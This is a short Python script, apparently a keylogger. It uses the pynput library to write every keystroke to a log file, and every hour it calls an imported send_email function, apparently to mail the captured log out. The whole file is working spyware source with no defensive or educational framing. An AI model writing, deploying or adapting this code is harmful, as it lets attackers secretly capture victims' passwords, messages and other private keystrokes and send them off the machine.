from pynput.keyboard import Listener
import schedule
import time

from send_email import send_email

def on_press(key):
    with open('log.txt', 'a') as file:
        file.write(str(key)+'\n')

def job():
    send_email()

schedule.every(1).hour.do(job)

def run_schedule():
    while True:
        schedule.run_pending()
        time.sleep(1)


with Listener(on_press=on_press) as listener:
    run_schedule()
    listener.join()
